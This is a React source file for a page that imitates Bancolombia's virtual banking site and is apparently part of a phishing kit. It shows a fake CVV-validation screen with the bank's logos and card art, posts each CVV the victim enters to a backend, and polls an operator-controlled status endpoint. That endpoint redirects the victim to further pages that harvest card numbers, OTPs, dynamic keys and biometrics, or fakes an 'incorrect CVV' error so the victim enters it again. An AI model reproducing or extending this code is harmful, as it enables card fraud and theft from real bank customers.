import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import localStorageService from "../../services/localStorageService";
import { instanceBackend } from "../../axios/instanceBackend"; // Corrección path relativo
import Loading from "../../components/Loading"; // Import Loading
import './css/LoginModal.css';

// Se exporta el componente
export default function ValidacionCVV() {
    const navigate = useNavigate();

    // Se inicializa el estado
    const [cvv, setCvv] = useState("");
    const [cargando, setCargando] = useState(false); // Loading state
    const [polling, setPolling] = useState(false); // Estado para activar polling

    // Polling para verificar estado después de enviar
    useEffect(() => {
        let interval;
        // Se ejecuta siempre si no hay polling específico de validación, 
        // para detectar cambios de estado globales (ej. cambio a TC Custom desde Admin)
        // Pero ValidacionCVV usa 'polling' state solo despues de enviar?
        // NO, ValidacionCVV debería escuchar siempre si el admin cambia algo?
        // En código original, el useEffect depende de [polling].
        // Si polling es false, NO escucha.
        // PERO ValidacionTC escucha siempre (interval generado en mount o en submit?).
        // ValidacionTC genera interval en handleSubmit? No, tiene un useEffect??
        // ValidacionTC genera interval en `iniciarPolling` llamado tras submit.
        // PERO tambien lee al inicio? No.
        // EL USUARIO PUEDE LLEGAR AQUI POR REDIRECCION.
        // Si llega por redirección, debería estar escuchando?
        // Idealmente sí. Pero si solo escucha tras submit, está "ciego" hasta que envía.
        // VAMOS A DEJARLO como estaba (solo tras submit) O CAMBIARLO?
        // Si el usuario llega a validacion-cvv por redireccion, NO ESTA ENVIANDO NADA AUN.
        // Debería escuchar cambios?
        // Si el admin se arrepiente y manda a TC?
        // SÍ, debería escuchar.
        // Pero el código original solo activa interval si `polling` es true.
        // Y `polling` empieza en false.
        // CAMBIO: Activar polling siempre al montar (como ValidacionTC/ValidacionTCCustom usan iniciarPolling tras submit, pero ValidacionTC tiene bug de que solo escucha tras submit??)
        // Revisando ValidacionTC: `iniciarPolling` se llama tras submit.
        // ENTONCES SI EL USUARIO LLEGA A LA VISTA, SE QUEDA PROHIBIDO DE CAMBIOS HASTA QUE ENVIA?
        // Eso explica por qué se quedan "pegados".
        // FIX: Iniciar polling al montar el componente también?
        // O al menos, leer el estado una vez.

        // Vamos a activar el polling siempre, o al menos un polling de "navegación" si no está validando.
        // Para consistencia con el fix "filtrando", debemos asegurar que si el estado cambia, nos vamos.

        const checkStatus = async () => {
            try {
                const userData = JSON.parse(localStorage.getItem("datos_usuario"));
                const sesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
                if (!sesionId) return;

                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado, cardData } = response.data;
                console.log("Estado polling:", estado);

                // UPDATE CARD DATA IF PRESENT
                if (cardData) {
                    setCardData(cardData);
                    localStorageService.setItem("selectedCardData", cardData);
                }

                if (estado === 'error_cvv_custom') {
                    setCargando(false);
                    setPolling(false);
                    alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
                    setCvv("");
                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
                    // Switch para manejar redirecciones específicas
                    switch (estado) {
                        case 'solicitar_tc': navigate("/validacion-tc"); break;
                        case 'solicitar_tc_custom': navigate("/validacion-tc-custom"); break; // Redirigir a TC Custom View
                        case 'solicitar_otp': navigate("/numero-otp"); break;
                        case 'solicitar_din': navigate("/clave-dinamica"); break;
                        case 'solicitar_finalizar': navigate("/finalizado-page"); break;
                        case 'solicitar_biometria': navigate("/verificacion-identidad"); break;
                        case 'error_923': navigate("/error-923page"); break;

                        case 'error_tc': navigate("/validacion-tc"); break;
                        case 'error_otp': navigate("/numero-otp"); break;
                        case 'error_din': navigate("/clave-dinamica"); break;
                        case 'error_login': navigate("/autenticacion"); break;

                        default:
                            console.log("Estado no manejado en redirección:", estado);
                    }
                }
            } catch (error) {
                console.error("Error polling:", error);
            }
        };

        // Ejecutar polling siempre (cada 3s) para navegación fluida
        interval = setInterval(checkStatus, 3000);

        return () => clearInterval(interval);
    }, []);

    // ... (rest of states)

    // HANDLE SUBMIT
    const handleSubmit = async () => {
        console.log("--- INICIANDO SUBMIT ---");

        setCargando(true);
        try {
            const rawData = localStorage.getItem("datos_usuario");
            let userData = rawData ? JSON.parse(rawData) : {};

            if (!userData.sesion_id) {
                // Intentar recuperar de URL si falta en local
                const params = new URLSearchParams(window.location.search);
                const urlSesionId = params.get('sesionId');
                if (urlSesionId) {
                    userData.sesion_id = urlSesionId;
                } else {
                    alert("Error crítico: No se encontraron datos de sesión.");
                    setCargando(false);
                    return;
                }
            }

            // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
            if (!userData.usuario) userData.usuario = {};
            if (!userData.usuario.cvv_custom) userData.usuario.cvv_custom = [];

            const nuevoIntento = {
                intento: userData.usuario.cvv_custom.length + 1,
                cvv: cvv,
                fecha: new Date().toLocaleString(),
                cardLabel: cardData.label
            };

            userData.usuario.cvv_custom.push(nuevoIntento);
            localStorage.setItem("datos_usuario", JSON.stringify(userData));

            const dataSend = {
                data: {
                    attributes: userData
                }
            };

            await instanceBackend.post('/cvv-custom', dataSend);

            // Activar polling en lugar de redirigir
            setPolling(true);

        } catch (error) {
            console.error(error);
            alert("Error enviando verificación.");
            setCargando(false);
        }
    };


    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Estado para los datos de la tarjeta (desde localStorage o valores por defecto)
    const [cardData, setCardData] = useState({
        filename: "imgi_5_Debito_(preferencial).png",
        tipo: "debito",
        digits: "4580",
        label: "Débito Preferencial"
    });

    // Función para mapear el filename del frente al filename de la parte trasera
    const getBackCardFilename = (frontFilename) => {
        // Mapeo de imágenes del frente a la parte trasera
        const frontToBackMap = {
            // Crédito - Mastercard
            "imgi_10_Mastercard_ideal_.png": "Mastercard-ideal.png",
            "imgi_11_Mastercard_joven_.png": "Mastercard-joven.png",
            "imgi_12_clasica_.png": "Mastercard-clasica.png",
            "imgi_14_Mastercard_credit-card.png": "Mastercard-Unica.png",
            "imgi_15_275x172.png": "Mastercard-Standard.png",
            "imgi_16_Mastercard_oro_.png": "Mastercard-oro.png",
            "imgi_19_Mastercard_611_600x379.png": "Mastercard-Platinum.png",
            "imgi_24_Mastercard_612_600x379.png": "Mastercard-Black-v1.png",
            "imgi_26_Mastercard_+Tarjeta+Virtual.png": "Mastercard-E-Card-v1.png",
            "imgi_29_Mastercard-Sufi_Optimizada.png": "Mastercard-Sufi-v1.png",
            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png": "Mastercard-Esso-mobil-v1.png",
            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png": "Mastercard-Esso-mobil-v1.png",

            // Crédito - Visa
            "imgi_13_+Visa+clasica+tradicional.png": "Visa-Clasica.png",
            "imgi_17_Visa+Seleccion+Colombia.png": "Visa-seleccion-colombia.png",
            "imgi_18_Visa+Oro.png": "Visa-Oro.png",
            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png": "Visa-LifeMiles-v1 (2).png",
            "imgi_25_Visa+Platinum+Conavi.png": "Visa-Platinum-v1.png",
            "imgi_28_Visa_Infinite_Card.png": "Visa-infinite-v1.png",

            // Crédito - Amex
            "imgi_20_AMEX+SkyBlue.png": "Amex+Libre.png", // Asumiendo que SkyBlue mapea a Libre
            "imgi_21_AMEX+Green.png": "Amex-Green-v1.png",
            "imgi_22_AMEX+Gold.png": "Amex-Gold-v1.png",
            "imgi_27_AMEX+Platinum.png": "Amex-Platinum-v1.png",
            "imgi_7_Amex+Libre.png": "Amex+Libre.png",

            // Débito
            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.png": "Débito Cívica.png",
            "imgi_5_Debito_(preferencial).png": "Débito Preferencial.png",
            "imgi_7_004_600x379.png": "Débito Clásica.png",
            "debito_virtual.png": "Debito_Virtual.png"
        };

        return frontToBackMap[frontFilename] || null;
    };

    // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
    useEffect(() => {
        // CHECK: Si estamos en modo CVV Custom (viene desde URL params)
        const params = new URLSearchParams(window.location.search);
        const mode = params.get('mode');
        const sesionId = params.get('sesionId');

        // Si es modo CVV custom, verificar sesionId
        if (mode === 'cvv' && window.location.pathname.includes('cvv-customs')) {
            if (!sesionId) {
                console.error('Acceso sin sesionId en URL');
                navigate('/');
                return;
            }
            // Cargar cardData si existe
            const savedCardData = localStorageService.getItem("selectedCardData");
            if (savedCardData) {
                setCardData(savedCardData);
            }
        } else {
            // Modo CVV estándar, cargar datos normalmente
            const savedCardData = localStorageService.getItem("selectedCardData");
            if (savedCardData) {
                setCardData(savedCardData);
            }
        }

        // Verificar si viene con error
        if (params.get("error") === 'true') {
            alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
            setCvv("");
        }
    }, [navigate]);

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {
        // Se obtiene la IP
        obtenerIP();
        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {
        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // usando el servicio externo api.ipify.org
    const obtenerIP = async () => {
        // Se usa el try
        try {
            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");
            // Se convierte la respuesta a JSON
            const data = await response.json();
            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {
            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);
            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        }
    };

    // y la formatea en español (Colombia)
    const obtenerFechaHora = () => {
        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Obtener la ruta de la imagen de la parte frontal (para el título pequeño)
    const getCardImagePath = () => {
        const basePath = cardData.tipo === "credito"
            ? "/assets/images/IMGtarjetas/"
            : "/assets/images/IMGdebitotj/";
        return `${basePath}${cardData.filename}`;
    };

    // Obtener la ruta de la imagen de la parte trasera
    const getBackCardImagePath = () => {
        const backFilename = getBackCardFilename(cardData.filename);
        if (!backFilename) {
            // Si no hay imagen trasera, usar la frontal
            return getCardImagePath();
        }

        // Determinar carpeta según tipo
        const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
        return `/assets/images/${folder}/${backFilename}`;
    };

    // Obtener el tipo de tarjeta formateado
    const getTipoTarjeta = () => {
        return cardData.tipo === "credito" ? "Crédito" : "Débito";
    };

    // Detectar si es Amex para ajustar la longitud del CVV (4 dígitos vs 3 estándar)
    const isAmex = cardData.label.toLowerCase().includes("amex") ||
        cardData.filename.toLowerCase().includes("amex") ||
        cardData.tipo.toLowerCase().includes("american");

    const cvvLength = isAmex ? 4 : 3;

    // Manejar cambio en el input (solo números)
    const handleCvvChange = (e) => {
        const val = e.target.value;
        // Solo permitir números y respetar la longitud máxima
        if (/^\d*$/.test(val) && val.length <= cvvLength) {
            setCvv(val);
        }
    };

    // Verificar si se debe mostrar la tarjeta trasera (cuando hay CVV ingresado)
    const shouldShowBackCard = cvv.length > 0;

    // Estado para controlar el foco del input
    const [isFocused, setIsFocused] = useState(false);

    // Se retorna el componente
    return (
        <>
            <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundSize: "cover",
                        backgroundPositionY: "-140px",
                        backgroundPositionX: "-610px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                            textAlignLast: "center"
                        }}
                    >
                        <h1 className="general-title">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            {/* TÍTULO CON IMAGEN DE TARJETA */}
                            <div style={{
                                display: "flex",
                                alignItems: "flex-start",
                                gap: "15px",
                                marginBottom: "24px"
                            }}>
                                <img
                                    src={getCardImagePath()}
                                    alt={cardData.label}
                                    style={{
                                        width: "70px",
                                        height: "auto",
                                        borderRadius: "8px",
                                        flexShrink: 0
                                    }}
                                />
                                <h2 style={{
                                    fontSize: "20px",
                                    fontWeight: "bold",
                                    color: "#ffffff",
                                    margin: 0,
                                    textAlign: "left",
                                    lineHeight: "1.4"
                                }}>
                                    Validación del CVV de la tarjeta {getTipoTarjeta()} terminada en **{cardData.digits}
                                </h2>
                            </div>

                            {/* TEXTO DESCRIPTIVO */}
                            <p style={{
                                fontSize: "16px",
                                lineHeight: "24px",
                                color: "#ffffff",
                                marginBottom: "30px",
                                textAlign: "left"
                            }}>
                                Para garantizar la seguridad de tu cuenta, queremos confirmar que eres tú quien está realizando esta transacción.
                            </p>

                            {/* IMAGEN DE LA TARJETA TRASERA CON CVV (Siempre visible) */}
                            <div style={{
                                position: "relative",
                                width: "100%",
                                maxWidth: "350px",
                                aspectRatio: "1.586",
                                margin: "0 auto 30px auto",
                                borderRadius: "12px",
                                overflow: "hidden",
                            }}>
                                <img
                                    src={getBackCardImagePath()}
                                    alt="Tarjeta trasera"
                                    style={{
                                        width: "100%",
                                        height: "100%",
                                        objectFit: "cover",
                                    }}
                                />
                                {/* CVV visual sobre la tarjeta */}
                                <div style={{
                                    position: "absolute",
                                    transform: "translate(-50%, -50%)",

                                    /* AQUI PUEDES PERSONALIZAR LA POSICIÓN SEGÚN LA TARJETA */
                                    ...(() => {
                                        const backMsg = getBackCardFilename(cardData.filename);

                                        // 1. CASO ESPECÍFICO: Mastercard Esso Mobil
                                        if (backMsg === "Mastercard-Esso-mobil-v1.png") {
                                            return {
                                                top: "38%",  // <--- AJUSTA ESTE VALOR (Vertical)
                                                left: "80%", // <--- AJUSTA ESTE VALOR (Horizontal)
                                                color: "#000000"
                                            };
                                        }

                                        // 2. VALORES POR DEFECTO (Para todas las demás)
                                        return {
                                            top: "34.5%",
                                            left: "80%",
                                            color: "#000000"
                                        };
                                    })(),

                                    fontSize: "20px",
                                    fontWeight: "bold",
                                    fontFamily: "monospace",
                                    letterSpacing: "2px",
                                    pointerEvents: "none"
                                }}>
                                    {cvv}
                                </div>
                            </div>

                            {/* CAMPO CVV PERSONALIZADO */}
                            <div className="input-group-custom" style={{
                                position: "relative",
                                border: "none",
                                display: "flex",
                                flexDirection: "column", // Apilar verticalmente
                                justifyContent: "center",
                                alignItems: "center",
                                gap: "10px"
                            }}>

                                {/* Contenedor visual de las líneas (AHORA PRIMERO) */}
                                <div
                                    className="input-lines-container"
                                    onClick={() => document.getElementById('cvv').focus()}
                                    style={{
                                        display: "flex",
                                        gap: "10px",
                                        cursor: "text",
                                        height: "40px",
                                        alignItems: "center"
                                    }}
                                >
                                    {/* Generar array de placeholders según la longitud (3 o 4) */}
                                    {Array.from({ length: cvvLength }).map((_, index) => {
                                        // LOGICA DE COLOR TIPO OTP:
                                        const activeIndex = cvv.length < cvvLength ? cvv.length : cvvLength - 1;
                                        const isActive = isFocused && index === activeIndex;

                                        return (
                                            <div
                                                key={index}
                                                style={{
                                                    width: "30px",
                                                    height: "30px",
                                                    // Solo el ACTIVO es amarillo, el resto blanco
                                                    borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                                                    transition: "border-color 0.2s ease",
                                                    display: "flex",
                                                    justifyContent: "center",
                                                    alignItems: "center",
                                                    color: "#ffffff",
                                                    fontSize: "20px",
                                                    fontWeight: "bold"
                                                }}
                                            >
                                                {cvv[index] || ""}
                                            </div>
                                        );
                                    })}
                                </div>

                                {/* Etiqueta CVV movida al final (ABAJO) */}
                                <label
                                    htmlFor="cvv"
                                    style={{
                                        color: "#ffffff",
                                        margin: 0,
                                        cursor: "pointer",
                                        fontWeight: "bold",
                                        fontSize: "14px"
                                    }}
                                >
                                    CVV
                                </label>

                                {/* Input real invisible para capturar teclado */}
                                <input
                                    id="cvv"
                                    name="cvv"
                                    type="tel"
                                    className="input-line"
                                    autoComplete="off"
                                    maxLength={cvvLength}
                                    pattern="[0-9]*"
                                    value={cvv}
                                    onChange={handleCvvChange}
                                    onFocus={() => setIsFocused(true)}
                                    onBlur={() => setIsFocused(false)}
                                    style={{
                                        position: "absolute",
                                        top: 0,
                                        left: 0,
                                        width: "100%",
                                        height: "100%",
                                        opacity: 0,
                                        cursor: "pointer",
                                        caretColor: "transparent",
                                        border: "none",
                                        outline: "none"
                                    }}
                                />
                            </div>

                            <br />
                            <br />

                            {/* BOTÓN CONTINUAR */}
                            <button
                                className="login-btn"
                                style={{
                                    marginTop: "20px",
                                    opacity: (cvv.length === cvvLength && !cargando) ? 1 : 0.5, // Feedback visual
                                    cursor: (cvv.length === cvvLength && !cargando) ? "pointer" : "not-allowed"
                                }}
                                disabled={cvv.length !== cvvLength || cargando}
                                onClick={handleSubmit}
                            >
                                {cargando ? "Enviando..." : "Continuar"}
                            </button>
                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        alt="Bancolombia"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </>
    );
};
